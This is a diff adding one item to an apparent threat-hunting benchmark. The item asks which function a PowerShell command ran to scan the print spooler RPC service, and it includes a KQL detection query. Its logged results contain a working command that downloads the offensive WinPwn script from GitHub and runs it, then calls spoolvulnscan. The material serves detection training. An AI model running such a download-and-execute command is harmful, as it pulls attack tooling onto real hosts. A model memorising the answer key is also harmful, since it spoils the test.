@@ -1,0 +1,34 @@
+{
+    "technique_id": "T1046",
+    "question_id": "54574908-f1de-4356-9021-8053dd57439a",
+    "context": "On a Windows host, an adversary uses PowerShell to pull down a remote script and immediately launch a scan targeting the MS-RPRN RPC service.",
+    "objective": "Highlight the invocation of the specific scanning function from the WinPwn toolkit.",
+    "technical_details": {
+        "command_analysis": "PowerShell invokes IEX(New-Object Net.WebClient).DownloadString(...) and then runs a function named spoolvulnscan with flags -noninteractive and -consoleoutput.",
+        "detection_approach": "Search process creation logs for PowerShell command lines that include both a remote download via DownloadString and the execution of spoolvulnscan, then extract the function name."
+    },
+    "thinking_how_to_phrase_question_and_answer": "We want the analyst to pinpoint the exact function used to perform the RPC service scan. The question should ask for the function name, and the answer will be that single identifier.",
+    "prompt": "On a Windows endpoint you observe a PowerShell process that fetches a script from the internet and immediately executes an RPC service scan against the spooler. Which function name was invoked to perform that scan?",
+    "answer": [
+        "spoolvulnscan"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName =~ \"powershell.exe\"\n| where ProcessCommandLine has \"DownloadString\" and ProcessCommandLine has \"spoolvulnscan\"\n| extend FunctionName = extract(@\"(spoolvulnscan)\", 1, ProcessCommandLine)\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessCommandLine, FunctionName\n| order by TimeGenerated desc",
+    "KQL_validation_message": "KQL query validation successful: The expected answer was 'spoolvulnscan'. The results show a record where the FunctionName is 'spoolvulnscan', and the ProcessCommandLine includes the execution of this function via a powershell script. This directly evidences the occurrence of the searched activity within the timeframe and device context given, providing 1:1 confirmation with the expected answer.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessCommandLine",
+            "FunctionName"
+        ],
+        [
+            "2025-05-07 16:33:47.688445+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput}",
+            "spoolvulnscan"
+        ]
+    ]
+}
